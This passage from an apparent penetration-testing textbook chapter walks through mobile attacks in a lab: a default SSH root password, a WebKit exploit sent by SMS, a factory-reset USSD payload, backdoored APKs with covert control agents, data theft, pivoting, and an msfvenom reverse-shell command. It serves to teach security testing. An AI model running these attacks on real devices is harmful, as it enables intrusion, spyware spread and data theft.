jailbroken iPhones, users can install SSH to log in to their iPhone terminals remotely. By default, SSH has the root password alpine on all devices. 
Of course, users should change this value, but many who jailbreak their 
iPhones do not. Though this issue came to light years ago, as with many 
default password issues, it continues to pop up. 
To test for this default SSH password on a jailbroken iPhone, we could 
choose 5.) Run a Remote Attack, or use our old friend, Metasploit. Much as 
SET allowed us to create client-side attacks in Metasploit in Chapter 11, we 
can use SPF to interface with Msfcli to automate running mobile modules 
from Metasploit. 
Unfortunately, as of this writing, not much in Metasploit targets mobile 
devices, but one module does test for use of the default iPhone password. As 
shown in Listing 20-7, from the main SPF menu choose 8.) Use Metasploit, 
and then choose 1.) Run iPhone Metasploit Modules. Next, choose 1.) Cydia 
Default SSH Password. SPF will ask you for the IP address of the iPhone in 
order to fill in the RHOST option in the module. SPF will then call Msfcli and 
run the desired module.
spf> 8
Runs smartphonecentric Metasploit modules for you.
Select An Option from the Menu:
 1.) Run iPhone Metasploit Modules
 2.) Create Android Meterpreter
 3.) Setup Metasploit Listener
spf> 1
454 Chapter 20
Select An Exploit:
 1.) Cydia Default SSH Password
 2.) Email LibTiff iOS 1
 3.) MobileSafari LibTiff iOS 1
spf> 1
Logs in with alpine on a jailbroken iPhone with SSH enabled.
iPhone IP address: 192.168.20.13
[*] Initializing modules...
RHOST => 192.168.20.13
[*] 192.168.20.13:22 - Attempt to login as 'root' with password 'alpine'
[+] 192.168.20.13:22 - Login Successful with 'root:alpine'
[*] Found shell.
[*] Command shell session 1 opened (192.168.20.9:39177 -> 192.168.20.13:22) at 
2015-03-21 14:02:44 -0400
ls
Documents
Library
Media
--snip--
Listing 20-7: Root SSH default password Metasploit module
If you have a jailbroken iPhone handy, you can test this module. Metasploit 
will present you with a root shell if the login succeeds. When you are finished, 
type exit to close the shell and return to SPF. Of course, if you have SSH on 
your iPhone, be sure to change the password from alpine right away. 
Client-Side Attack
With mobile devices, client-side attacks are more prevalent than remote attacks. 
And as with the attacks we studied in Chapter 10, our client-side attacks are 
not restricted to the mobile browser. We can attack other default apps on 
the device as well as any third-party apps that may have bugs. 
Client-Side Shell
Let‚Äôs look at an example of attacking the WebKit package in the mobile 
browser to gain a shell on an Android device. (This is similar to the browser 
attacks discussed in Chapter 10.) We‚Äôll attack a flaw in the mobile browser 
after enticing the user into opening a malicious page. The executed shellcode will be for Android, not Windows, but the overall attack dynamics are 
the same, as shown in Listing 20-8. 
spf> 6
Choose a social engineering or client side attack to launch:
 1.) Direct Download Agent
 2.) Client Side Shell
 3.) USSD Webpage Attack (Safe)
 4 ) USSD Webpage Attack (Malicious)
Using the Smartphone Pentest Framework 455
spf> 2u
Select a Client Side Attack to Run
 1) CVE=2010-1759 Webkit Vuln Android
spf> 1v
Hosting Path: /spfbook2w
Filename: /book.htmlx
Delivery Method(SMS or NFC): SMSy
Phone Number to Attack: 15555215558
Custom text(y/N)? N
Listing 20-8: Android browser attack
From the main SPF menu choose 6.) Run a social engineering or client 
side attack. Now choose 2.) Client Side Shell u then exploit option 1.) 
CVE=2010-1759 Webkit Vuln Android v. You will be prompted for the path on 
the web server w and asked for a filename x. SPF will then generate a malicious page to attack the CVE-2010-1759 WebKit vulnerability. 
You will then be asked how you want to deliver a link to the malicious 
page y. You can use either NFC or SMS. Because our emulator does not 
support NFC, we choose SMS. When prompted for the number to attack, 
send the SMS to your Android 2.1 emulator. Finally, when asked if you want 
to use custom text for the SMS (rather than the default ‚ÄúThis is a cool page: 
<link>‚Äù), change the default to something more creative, or not.
We have only one mobile modem attached to SPF, so SPF automatically uses it to send the SMS message. SPF contacts our SPF app on the 
Android 4.3 emulator and instructs it to send a text message to the 
Android 2.1 emulator. The SMS received by the Android 2.1 emulator 
will be from the Android 4.3 emulator. (Some mobile devices, such as 
iPhones, have a flaw in how they implement SMS that allows attackers to 
spoof the sender number to make it look like this attack came from any 
number they‚Äôd like.) The message received is shown here. 
15555215554: This is a cool page: http://192.168.20.9/spfbook2/book.html
Like the client-side attacks discussed in Chapter 10, this attack relies on 
the user opening the link in a vulnerable mobile browser. Our Android 2.1 
emulator browser is vulnerable to the attack, and when you click the link 
to open the mobile browser, the browser will attempt to open the page for 
30 seconds or so as the attack is running, before crashing. At that point, 
you should have a shell waiting for you in SPF. SPF automatically runs the 
Android equivalent of whoami when the shell opens. 
Because we attacked the browser, we‚Äôre running as app_2, the mobile 
browser on our emulator. As usual, the shell has all the permissions of the 
exploited app, meaning that you can run any commands available to the 
browser. For example, enter /system/bin/ls, as shown in Listing 20-9, to use 
ls to list the contents of the current directory. When you‚Äôve finished, enter 
exit to return to SPF. 
456 Chapter 20
Connected: Try exit to quit
uid=10002(app_2) gid=10002(app_2) groups=1015(sdcard_rw),3003(inet)
/system/bin/ls
sqlite_stmt_journals
--snip--
exit
Listing 20-9: Android shell
N ote Android is a forked Linux kernel, so once we have a shell, we should be ready to
go with Android, right? Unfortunately, many Linux utilities like cp aren‚Äôt there. 
Additionally, the user structure is a bit different, with each app having its own UID. 
A deep dive into Android, however, is beyond the scope of this chapter. 
We‚Äôll look at an alternative way to control exploited Android devices, 
using backdoored apps to call Android APIs, later in this chapter. But first 
let‚Äôs look at another client-side attack. 
USSD Remote Control
Unstructured Supplementary Service Data (USSD) is a way for mobile devices to 
communicate with the mobile network. When you dial specific numbers, 
the device will perform certain functions. 
In late 2012, it came to light that some Android devices would automatically open a number they discovered on a web page in the dialer application. 
When USSD codes are entered in the dialer, the functionality is automatically called. That sounds like a great function for attackers to abuse to control a device remotely.
As it turned out, attackers could put USSD codes in a web page as the 
number to dial and end up forcing these vulnerable devices to do all sorts 
of interesting things. For example, as shown here, the tel: tag in a malicious web page tells Android this is a phone number. But when the USSD 
code 2673855%23 is opened in the dialer, the device performs a factory 
restore, deleting all the user‚Äôs data. 
<html>
<frameset>
<frame src="tel:*2767*3855%23" />
</frameset>
</html>
N ote The vulnerability is not in the USSD code itself, but in certain devices‚Äô implementation of the tel: tag. Various USSD tags offer all sorts of functionality.
Our example will use a more innocuous payload than the one described 
previously. We‚Äôll have our device automatically dial a code to present its 
unique identifier in a pop-up, as shown in Listing 20-10. 
Using the Smartphone Pentest Framework 457
spf> 6
Choose a social engineering or client side attack to launch:
 1.) Direct Download Agent
 2.) Client Side Shell
 3.) USSD Webpage Attack (Safe)
 4 ) USSD Webpage Attack (Malicious)
spf> 3u
Hosting Path: /spfbook2
Filename: /book2.html
Phone Number to Attack: 15555215558
Listing 20-10: Android USSD attack
To run the safe USSD example in SPF, choose menu option 6, then 
3.) USSD Webpage Attack (Safe) u. You‚Äôll be asked for the location of the web 
server, the name of the malicious page, and the phone number to text it to. 
Send it to your Android 2.1 emulator. 
Now open the page in the SMS you receive on the Android 2.1 emulator. This time, instead of crashing the browser, the dialer app opens, and a 
pop-up notification appears, as shown in Figure 20-2.
Figure 20-2: USSD autodial
As it turns out, our emulator has no unique identifier, so the number is 
blank. Though this example was not harmful to the device or its data, other 
USSD codes can be if they are opened in the dialer. 
458 Chapter 20
N ote Of course, this vulnerability, as well as the WebKit issue we exploited in the previous
section, has been patched since its discovery. Android has a complicated relationship 
with security updates. The problem is that anyone can make an Android device with 
its own implementation of the Android OS. When Google releases a new version 
with a set of patches, every original equipment manufacturer (OEM) needs to port 
the changes to its version of Android, and the carriers need to push updates to their 
devices. However, updates are not delivered consistently, which means that millions 
of unpatched devices may be in use, depending on the model and the carrier.
Now let‚Äôs turn our attention to a vulnerability that will probably never 
be patched: malicious applications. 
Malicious Ap
We‚Äôve studied malicious programs intermittently throughout this book. We 
created malicious executables with Msfvenom in Chapter 4, uploaded backdoors to vulnerable web servers in Chapter 8, looked at social-engineering 
attacks to trick users into downloading and running malicious programs in 
Chapter 11, and bypassed antivirus programs in Chapter 12. 
While social engineering and users undermining security policies 
by running malicious programs will likely be major issues for enterprise 
security for years to come, mobile devices make this issue even more complicated. It‚Äôs hard to imagine anyone giving you a laptop computer for work 
and encouraging you to go out to the Internet and download every potentially interesting, fun, or productivity-increasing program you can find‚Äî
but that‚Äôs exactly how mobile devices are marketed. (‚ÄúBuy our device. It has 
the best apps.‚Äù ‚ÄúDownload our apps. They‚Äôre the best in productivity/entertainment/security.‚Äù) Mobile antivirus applications often require extreme 
permissions and even administrative functions on the device in order to 
run, and mobile device management solutions typically require installing 
even more applications on the device. 
Mobile users are inundated with reasons to download apps to their 
devices, and mobile malware is on the rise, much of it in the form of malicious applications. If a user can be tricked into installing a malicious app, 
the attacker can utilize Android‚Äôs APIs to steal data, gain remote control, 
and even attack other devices. 
In the Android security model, apps must request permissions to use 
APIs that could be used maliciously, and users must accept the requested 
permissions at installation. Unfortunately, users often grant access to all 
sorts of potentially dangerous permissions. We can use Android permissions to control the device without running an additional exploit after the 
user installs the malicious app. 
Using the Smartphone Pentest Framework 459
Creating Malicious SPF Agents
SPF allows us to create a malicious app with a variety of interesting functionality. Earlier we used the SPF app on our pentester-controlled device to 
allow SPF to use the device‚Äôs mobile modem and other functionality; our 
goal here is to trick users into installing the SPF agent on target devices. 
As of this writing, SPF agents can receive commands by checking in to a 
web server over HTTP or via hidden SMS messages from an SPF-controlled 
mobile modem. Naturally, we‚Äôll be more successful if our agent appears to be 
an interesting and/or trustworthy app. We can embed the agent inside any 
legitimate app: SPF can take a compiled APK file and backdoor it with the 
agent, or if we have the source code of the app, we can backdoor that as well. 
Backdooring Source Code 
Let‚Äôs use backdooring source code for our example. Choose 1.) Attach 
Framework to a Deployed Agent/Create Agent at the main SPF menu. SPF 
includes a couple of app templates that we can use for our example. You 
can also import any app source code into SPF with option 4. If you don‚Äôt 
have source code for the app you want to impersonate, you can use option 5
to backdoor a compiled APK. You can even use the Android Master Key 
vulnerability discovered in 2013 to replace applications already installed 
on the device with a backdoored version. For now, let‚Äôs just use one of SPF‚Äôs 
templates, as shown in Listing 20-11. 
spf> 1
Select An Option from the Menu:
 1.) Attach Framework to a Deployed Agent
 2.) Generate Agent App
 3.) Copy Agent to Web Server
 4.) Import an Agent Template
 5.) Backdoor Android APK with Agent
 6.) Create APK Signing Key
spf> 2u
 1.) MapsDemo
 2.) BlankFrontEnd
spf> 1v
Phone number of the control modem for the agent: 15555215554w
Control key for the agent: KEYKEY1x
Webserver control path for agent: /androidagent1y
Control Number:15555215554
Control Key:KEYKEY1
ControlPath:/androidagent1
Is this correct?(y/n) y
--snip--
BUILD SUCCESSFUL
Listing 20-11: Building the Android agent
460 Chapter 20
Choose 2.) Generate Agent App u. We‚Äôll use the MapsDemo example 
template v distributed with Android SDK by Google to demonstrate functionality. When prompted, give the phone number to send SMS commands 
to w, the SPF the seven-character key x, and the directory to check in for 
HTTP commands y. For the agent key and path, use the same values that 
you used when you created the SPF app (‚ÄúBuilding the Android App‚Äù on 
page 449). Use the Android 4.3 emulator (SPF app) phone number as 
the control phone number. SPF will build the Android agent in the chosen 
template. 
Now to entice the user into downloading and installing the agent, a 
process similar to our client-side attacks, following the steps in Listing 20-12. 
spf> 6 
Choose a social engineering or client side attack to launch:
 1.) Direct Download Agent
 2.) Client Side Shell
 3.) USSD Webpage Attack (Safe)
 4 ) USSD Webpage Attack (Malicious)
spf> 1u
This module sends an SMS with a link to directly download and install an Agent
Deliver Android Agent or Android Meterpreter (Agent/meterpreter:) Agentv
Hosting Path: /spfbook3w
Filename: /maps.apk
Delivery Method:(SMS or NFC): SMS
Phone Number to Attack: 15555215556
Custom text(y/N)? N
Listing 20-12: Enticing the user into installing the agent 
Choose option 6 at the main menu, 
and then choose 1.) Direct Download Agent
u. You will be asked if you want to send the 
Android agent or Android Meterpreter (a 
recent addition to Metasploit). Because we‚Äôre 
working with the Android agent, choose Agent
v. As usual, you are prompted for the path, 
app name on the web server, attack vector, 
and the number to attack, beginning at w. 
Instruct SPF to send an SMS with default 
text to the Android 2.2 emulator. 
On the Android 2.2 emulator, click the 
link in the SMS when it arrives. The app 
should be downloaded. After it downloads, 
click Install, accept the permissions, and 
open the app. As shown in Figure 20-3, the 
agent will look and feel like the original app 
template (the Google Maps demo), but it has 
some extra functionality in the background. Figure 20-3: Backdoored app 
Using the Smartphone Pentest Framework 461
Now to attach SPF to the deployed agent. If you send an SMS campaign 
to lots of numbers, who knows how many users will install the agent or how 
quickly, but the agent has check-in functionality (see Listing 20-13) that will 
respond to SPF‚Äôs query to see if it is deployed.
spf> 1
Select An Option from the Menu:
 1.) Attach Framework to a Deployed Agent
 2.) Generate Agent App
 3.) Copy Agent to Web Server
 4.) Import an Agent Template
 5.) Backdoor Android APK with Agent
 6.) Create APK Signing Key
spf> 1u
Attach to a Deployed Agent:
This will set up handlers to control an agent that has already been deployed.
Agent URL Path: /androidagent1v
Agent Control Key: KEYKEY1w
Communication Method(SMS/HTTP): HTTPx
URL Path: /androidagent1
Control Key: KEYKEY1
Communication Method(SMS/HTTP): HTTP
Is this correct?(y/N): y
Listing 20-13: Attaching SPF to the deployed agent 
Choose option 1 at the main menu and then choose 1.) Attach Framework
to a Deployed Agent u. You are prompted for the path v, key w, and communication method x. Enter the values you used when creating the agent.
SPF will appear to hang for a minute as it waits for the agent to respond. 
After it returns to the menu, you should be connected to the agent. Now 
choose 2.) Send Commands to an Agent from the main menu. You will be presented with a list of agents in the database; you should see the agent you just 
attached to SPF in the list as shown here. 
spf> 2
Available Agents:
15555215556
Backdooring APK
Before we move on to using our deployed SPF agent, let‚Äôs look at another, 
perhaps more sophisticated, way of creating an agent. Because you may not 
always have the source code of the app you want to backdoor, SPF can work 
with the precompiled APK file. Any APK, including those in the Google 
Play store, are in scope. 
462 Chapter 20
To backdoor an APK with the SPF agent, choose 1 from the main menu, 
and then 5.) Backdoor Android APK with Agent, as shown in Listing 20-14.
spf> 1
Select An Option from the Menu:
 1.) Attach Framework to a Deployed Agent
 2.) Generate Agent App
 3.) Copy Agent to Web Server
 4.) Import an Agent Template
 5.) Backdoor Android APK with Agent
 6.) Create APK Signing Key
spf> 5
APKTool not found! Is it installed? Check your config file
Install Android APKTool(y/N)?
spf> y
--2015-12-04 12:28:21-- https://android-apktool.googlecode.com/files/apktoolinstall-linux-r05-ibot.tar.bz2
--snip--
Puts the Android Agent inside an Android App APK. The application runs 
normally with extra functionality
APK to Backdoor: /root/Smartphone-Pentest-Framework/APKs/MapsDemo.apk
I: Baksmaling...
--snip--
Listing 20-14: Backdooring an APK
SPF does not install the APKTool program, required to decompile 
APKs, by default; it asks if you want to install it. Enter y, and SPF will install 
APKTool and continue. 
When prompted, tell SPF to backdoor the APK /root/Smartphone-Pentest
-Framework/APKs/MapsDemo.apk (a compiled version of the Google Maps 
demo code used previously). SPF will then decompile the APK, combine it 
with the SPF agent, and recompile it.
To set up the agent, SPF needs to know the control phone number, 
control key, and control path. This is the same information we used when 
backdooring source code and is shown in Listing 20-15.
Phone number of the control modem for the agent: 15555215554
Control key for the agent: KEYKEY1
Webserver control path for agent: /androidagent1
Control Number: 15555215554
Control Key:KEYKEY1
ControlPath:/androidagent1
Is this correct?(y/n) y
--snip--
Listing 20-15: Setting options
Using the Smartphone Pentest Framework 463
After APKTool recompiles the backdoored APK, we need to sign it. At 
installation, the Android device checks the signatures on an APK. If it is not 
signed, it will be rejected, even by an emulator. Google Play apps are signed 
using a developer key registered with Google Play. 
To run apps on emulators and devices that are not restricted to Google 
Play apps, we just use a debug key that is not registered with Google, but the 
app still must be signed. We were able to skip this step when backdooring 
source code because we compiled the code with the Android SDK, which 
automatically signed our code with the default Android keystore. Because 
we used APKTool here, we need to manually re-create the signature. 
You will be asked whether you want to use the Android Master Key 
vulnerability, which allows attackers and pentesters to trick the Android 
signature-verification process into thinking our app is a legitimate update 
to an already installed application. In other words, we will be allowed to 
replace legitimate applications with our code, and the Android system will 
view them as legitimate updates from the vendor. (This flaw in the verification process was fixed in Android 4.2.) To use the Android Master Key 
vulnerability, enter y at the prompt, as shown next. 
N ote To leverage this issue, the original application and its signatures are copied into our
backdoored APK. Details about how this triggers the Master Key vulnerability can be 
found here: http://www.saurik.com/id/17. 
Use Android Master Key Vuln?(y/N): y
Archive: /root/Desktop/abcnews.apk
--snip-- 
Inflating: unzipped/META-INF/CERT.RSA
To see the Android Master Key vulnerability at work, install the legitimate version of MapsDemo.apk from /root/Smartphone-Pentest-Framework/APKs
onto a device running an Android version earlier than 4.2, and then try to 
install the backdoored version you just created by delivering it via SMS or 
NFC with SPF. You should be prompted to replace MapsDemo.apk, and the 
signature verification should succeed, even though we didn‚Äôt have access 
to the private keys required to build a correct signature for our backdoored 
version. 
If your target is not vulnerable to Master Key or the app is not already 
on the target device, you can just sign the app with your default key for the 
Android keystore on Kali. To do this, enter n at the prompt for Use Android 
Master Key Vuln, as shown in Listing 20-16. 
Use Android Master Key Vuln?(y/N): n
Password for Debug Keystore is android
Enter Passphrase for keystore: 
--snip--
 signing: resources.arsc
Listing 20-16: Signing the APK 
464 Chapter 20
You are prompted for the password for the debug keystore. By default, 
this action does not sign the APK with a key for publishing it on Google 
Play, but it will work for our purposes. The app is now signed with a debug 
key and should install on any device that does not restrict apps to official 
Play Store apps. Note that there‚Äôs nothing stopping a pentester from signing 
the app with a legitimate Google Play key they have registered if it‚Äôs in the 
scope of the pentest to attempt to trick users into downloading malicious 
apps from the Google Play store. 
N ote The backdoored APK is functionality equivalent to the agent we created in ‚ÄúBackdooring
Source Code‚Äù on page 459 and can be deployed the same way. Of course, we already 
have a deployed agent to work with as we look at what we can do to a device and its 
local network after an agent is deployed. 
Mobile Post Exploitati
Now that we‚Äôre on the device, we have a few options open to us. We can 
gather local information from the device such as contacts or received SMS 
messages, and we can remotely control the device to have it do things like 
take a picture. If we‚Äôre unsatisfied with our permissions, we can attempt 
to perform privilege escalation on the device and get root privileges. We 
can even use the exploited mobile device to attack other devices on the 
network. (This attack can be particularly interesting if the device connects 
directly to a corporate network or uses a VPN to access one.) 
Information Gathering
We will run an example of information gathering by getting a list of 
installed applications on the infected device as shown in Listing 20-17. 
spf> 2
View Data Gathered from a Deployed Agent:
Available Agents:
 1.) 15555215556
Select an agent to interact with or 0 to return to the previous menu.
spf> 1u
Commands:v
 1.) Send SMS
 2.) Take Picture
 3.) Get Contacts
 4.) Get SMS Database
 5.) Privilege Escalation
 6.) Download File
 7.) Execute Command
 8.) Upload File
 9.) Ping Sweep
 10.) TCP Listener
 11.) Connect to Listener
 12.) Run Nmap
Using the Smartphone Pentest Framework 465
 13.) Execute Command and Upload Results
 14.) Get Installed Apps List 
 15.) Remove Locks (Android < 4.4)
 16.) Upload APK
 17.) Get Wifi IP Address
Select a command to perform or 0 to return to the previous menu
spf> 14w
 Gets a list of installed packages(apps) and uploads to a file.
Delivery Method(SMS or HTTP): HTTPx
Listing 20-17: Running a command on an agent
Choose option 2 from the main menu, then select the agent from the 
list u. When presented with a list of available agent functionality v, choose 
14.) Get Installed Apps List w. SPF asks how you would like to deliver the 
command; we‚Äôll use HTTP x. (Recall that agents can communicate and 
receive commands via HTTP and SMS.)
Enter 0 to return to the previous menu until you reach the main menu. 
Wait a minute, and then choose 3.) View Information Gathered, as shown in 
Listing 20-18. 
spf> 3
View Data Gathered from a Deployed Agent:
Agents or Attacks? Agentsu
Available Agents:
 1.) 15555215556
Select an agent to interact with or 0 to return to the previous menu.
spf> 1v
Data:
SMS Database: 
Contacts: 
Picture Location: 
Rooted: 
Ping Sweep: 
File: 
Packages: package:com.google.android.locationw
--snip--
package:com.android.providers.downloads
package:com.android.server.vpn
Listing 20-18: Viewing gathered data 
You are asked if you want to see the results of Attacks or Agents; type 
Agents u. Choose our agent v. Information about the device is pulled from 
the database, though currently all we have is a list of installed apps, gathered 
by the previous command w. (You can run additional information-gathering commands to fill in more entries.)
Remote Control
Now let‚Äôs see how to use the agent to remotely control the device. We can tell 
the device to send a text message that will not show up in the sent messages 
of the SMS app. In fact, the user will have no indication that a message 
466 Chapter 20
was sent at all‚Äîwhat better way to exploit the circle of trust? Perhaps we 
can grab all the user‚Äôs contacts and send them messages telling them they 
should install our cool app, which just so happens to point to the SPF agent. 
Because the message comes from someone they know, the users will be more 
likely to install the agent. 
Let‚Äôs just send an example message for now, as shown in Listing 20-19. 
Commands:
--snip--
Select a command to perform or 0 to return to the previous menu
spf> 1u 
Send an SMS message to another phone. Fill in the number, the message to send, 
and the delivery method(SMS or HTTP).
Number: 15555215558
Message: hiya Georgia
Delivery Method(SMS or HTTP) SMS
Listing 20-19: Remotely controlling an agent
From the agent commands menu, select option 1.) Send SMS u. When 
prompted for a phone number, message contents, and how you want to 
deliver the command, tell your agent to send the message to the Android 2.1 
emulator. 
Your Android 2.1 emulator will receive an SMS with the text you entered 
from the Android 2.2 emulator, with no indication on either emulator that 
this is not a normal message. 
Pivoting Through Mobile Devices 
Mobile Device Management (MDM) and mobile antivirus applications have 
a long way to go. The number of companies that mandate these solutions 
for their employees is still small when compared with many other security 
controls, and some companies choose not to allow mobile devices at all. 
But let‚Äôs face it: Employees probably know the company‚Äôs wireless password. Connect your mobile device, and magically it‚Äôs a member of the same 
network as your workstation and other devices that might contain sensitive 
information. 
Naturally, companies are much better at hardening their externally 
facing assets. After all, these devices are open to attack from anyone on 
the Internet, and they get the lion‚Äôs share of the attention. But internally, 
things start to break down. Weak passwords, missing patches, and out-of-date 
client-side software are all issues we‚Äôve examined in this book that could be 
lurking in the internal network. If an exploited mobile device has direct 
network access to these vulnerable systems, we may be able to use it as a 
pivot to launch additional attacks, completely bypassing the perimeter. 
We studied pivoting in Chapter 13, when we used an exploited machine 
to move from one network to another. We can do the same thing here 
using the SPF agent, effectively running a pentest on the mobile network 
through the exploited mobile device, as illustrated in Figure 20-4. 
Using the Smartphone Pentest Framework 467
attacker
Internet
local router
local PC
local infected
phone
Figure 20-4: Pivoting through an infected 
mobile device to attack internal devices
Portscanning with Nmap 
We start by seeing what devices are out there using an agent command option 
to ping sweep the local network. Next, we‚Äôll do some port scanning, as discussed in Chapter 5. As it turns out you can install Nmap Android binaries 
on the exploited device. SPF has install scripts for this and other supporting 
tools. Choose option 10.) Install Stuff from the main menu, and tell SPF to 
install Nmap for Android, as shown in Listing 20-20.
spf> 10
What would you like to Install?
 1.) Android SDKS
 2.) Android APKTool
 3.) Download Android Nmap
spf> 3
Download Nmap for Android(y/N)?
spf> y
Listing 20-20: Installing Nmap for Android 
Now to run Nmap from our Android agent using option 12.) Run Nmap. 
Let‚Äôs run Nmap against our Windows XP target u, as shown in Listing 20-21. 
Make sure that the War-FTP program we exploited in Chapters 17 and 18 
is still running. (We‚Äôll exploit it through the pivot in the next section.)
468 Chapter 20
Select a command to perform or 0 to return to the previous menu
spf> 12
 Download Nmap and port scan a host of range. Use any accepted format for 
target specification in Nmap
Nmap Target: 192.168.20.10u
Delivery Method(SMS or HTTP) HTTP
Listing 20-21: Running Nmap from Android 
Let Nmap run for a couple of minutes, and then check your agent‚Äôs 
gathered information. You should notice that the File field links to /root/
Smartphone-Pentest-Framework/frameworkconsole/text.txt. View the contents of 
this file‚Äîyou should see something similar to Listing 20-22. 
# Nmap 5.61TEST4 scan initiated Sun Sep 6 23:41:30 2015 as: /data/data/com.example.android.google
.apis/files/nmap -oA /data/data/com.example.android.google.apis/files/nmapoutput 192.168.20.10
Nmap scan report for 192.168.20.10
Host is up (0.0068s latency).
Not shown: 992 closed ports
PORT STATE SERVICE
21/tcp open ftp
--snip--
# Nmap done at Sun Sep 6 23:41:33 2015 -- 1 IP address (1 host up) scanned in 3.43 seconds
Listing 20-22: Nmap results
Rather than run an entire pentest using the exploited mobile device as 
a pivot, let‚Äôs finish by running an exploit through the SPF agent. 
Exploiting a System on the Local Network
Unfortunately, Android devices don‚Äôt know scripting languages such 
as Python and Perl by default; to run an exploit, we need some C code. 
A simple C version of the exploit we wrote for War-FTP 1.65 in Chapter 17 
is in /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter.c. 
The included shellcode runs a windows/meterpreter/reverse_tcp payload and 
sends it back to 192.168.20.9 on port 4444. If your Kali system is at another 
IP address, regenerate the shellcode with Msfvenom, as shown here. (Don‚Äôt 
forget the bad characters for War-FTP from Chapter 17. We can avoid them 
with Msfvenom using the -b flag.)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 -f c -b '\x00\x0a\x0d\x40'
Once you‚Äôve replaced the shellcode in the exploit, if necessary, we need 
to compile the C code to run on an Android device. If we use GCC, as in 
Chapter 3, the exploit will run fine from our Kali box, but the ARM processor on our Android phones won‚Äôt know what to make of it. 
We briefly ran into cross compilers for Windows in Chapter 12 that 
allowed us to compile C code on Kali to run on Windows. We can do the 
Using the Smartphone Pentest Framework 469
same thing for Android as long as we have an ARM cross compiler. Luckily, 
SPF has one. As shown in Listing 20-23, choose option 9.) Compile code to 
run on mobile devices from the main menu. 
spf> 9
Compile code to run on mobile devices
 1.) Compile C code for ARM Android
spf> 1u
Compiles C code to run on ARM based Android devices. Supply the C code file and the output 
filename
File to Compile: /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter.cv
Output File: /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter
Listing 20-23: Compiling C code to run on Android 
Select 1.) Compile C code for ARM Android u. You will be prompted for the 
C file to compile as well as where you want to put the compiled binary v. 
Now we need to download the War-FTP exploit to our infected Android 
device. From the agent commands menu, choose option 6 to download a 
file. You will be asked for the file to download and the delivery method, as 
shown in Listing 20-24.
Select a command to perform or 0 to return to the previous menu
spf> 6
 Downloads a file to the phone. Fill in the file and the delivery method(SMS or HTTP).
File to download: /root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter
Delivery Method(SMS or HTTP): HTTP
Listing 20-24: Downloading the exploit
Before we run the exploit, we need to set up a handler in Msfconsole, 
as shown in Listing 20-25. Open Msfconsole on Kali, and use the multi/
handler module, setting the options to match the payload in the War-FTP 
exploit.
msf > use multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(handler) > exploit
[*] Started reverse handler on 192.168.20.9:4444 
[*] Starting the payload handler...
Listing 20-25: Setting up multi/handler
Finally, it‚Äôs time to run the exploit. As shown in Listing 20-26, choose 
option 7.) Execute Command from the agent commands menu; you will be 
prompted for the command to run. 
470 Chapter 20
Select a command to perform or 0 to return to the previous menu
spf> 7
 Run a command in the terminal. Fill in the command and the delivery 
method(SMS or HTTP).
Command: warftpmeterpreter 192.168.20.10 21u
Downloaded?: yesv
Delivery Method(SMS or HTTP): HTTP
Listing 20-26: Running the exploit 
Tell SPF the full command, including arguments u. In this case, we 
need to tell the exploit the IP address and port to attack. SPF asks if the 
binary was downloaded. If it was downloaded through SPF, it will be in the 
agent‚Äôs files directory, and SPF will need to know to run it from there. In 
our case, we answer yes v, then enter the delivery method as usual. 
Watch your Metasploit listener. In about a minute you should receive a 
Meterpreter prompt like the one shown next. 
meterpreter > 
We‚Äôve successfully used SPF as a pivot to run an attack. This may not 
seem very exciting because the emulator, Kali, and the Windows XP target 
are all on the same network, but if Kali is in the cloud and the Windows XP 
target and an infected Android device are on the corporate network, this 
process would be more useful. We can make it more interesting by using 
command option 10.) TCP Listener to set up a listener to catch our shell on 
the infected mobile device. Rather than calling back out to a listener on our 
Kali machine, we can instead send our shell back to SPF directly using either 
HTTP or SMS. Using SMS will, of course, allow us to completely bypass any 
perimeter filtering such as firewalls and proxies that may inhibit getting 
shells out of the network from your attacks. This is illustrated in Figure 20-5.
attacker-controlled
phone
attacker
computer
Internet
cell
tower(s)
local infected
phone
local
exploited PC
local router
(bypassed)
Figure 20-5: Bypassing perimeter controls with an SMS-based shell.
Using the Smartphone Pentest Framework 471
N ote Aside from the privilege escalation example discussed next, there is no reason we
needed to use Android 2.2 as our target emulator. The other malicious app examples 
we have used in this chapter will work on any version of Android. 
Privilege Escalation 
As a forked Linux kernel, Android shares some of Linux‚Äôs privilege escalation vulnerabilities, as well as having a few security mistakes of its own. Even 
OEMs have added bugs into their implementations of Android. For example, 
in 2012, a privilege-escalation vulnerability was found in how Samsung 
devices handled the camera memory if they used a certain kind of chip, giving attackers read/write access to all of memory. 
If you want more permissions granted to your app, you can attempt to use 
a known issue from the agent to get root privileges, as shown in Listing 20-27. 
Commands:
--snip--
Select a command to perform or 0 to return to the previous menu
spf> 5
 1.) Choose a Root Exploit
 2.) Let SPF AutoSelect
Select an option or 0 to return to the previous menu
spf> 2u
 Try a privilege escalation exploit.
Chosen Exploit: rageagainstthecagev
Delivery Method(SMS or HTTP): HTTPw
Listing 20-27: Running a privilege-escalation exploit 
From the agent commands menu, choose option 5.) Privilege Escalation. 
From here we have two options. We can manually choose an exploit from 
the exploits for Android that SPF knows, or we can let SPF make a selection 
based on the Android version number. Our Android 2.2 emulator is vulnerable to an exploit known as Rage Against the Cage. Though this is an older 
exploit, it works well on the emulator, so let‚Äôs allow SPF to automatically 
select the exploit, as shown at u. Because this is Android 2.2, SPF correctly 
selects rageagainstthecage v and asks for the delivery method w. 
After giving the exploit a little time to run, check back with option 3
from the main menu. The Rooted field should read RageAgainstTheCage, as 
shown here.
Rooted: RageAgainstTheCage
From here we have full control of the device. We can issue commands 
from a root shell or reinstall the agent as a system app, giving us even more 
privileges than the original app. 
472 Chapter 20
note This particular exploit is a resource exhaustion attack, so if you want to continue 
using the emulator for additional exercises, you may want to restart it, as it may perform slower after this attack.
Summar
In this chapter, we took a brief look at the relatively new and rapidly evolving 
world of mobile exploitation. We used my SPF tool to run a variety of attacks, 
primarily on emulated Android mobile devices. These attacks will, of course, 
work on real devices in the same way. We looked at a remote attack that 
checked for a default SSH password on jailbroken iPhones, and then studied 
two client-side attack examples. One gave us a shell through a WebKit vulnerability in the browser, and the other remotely controlled the device through 
USSD codes that were automatically dialed from a web page. 
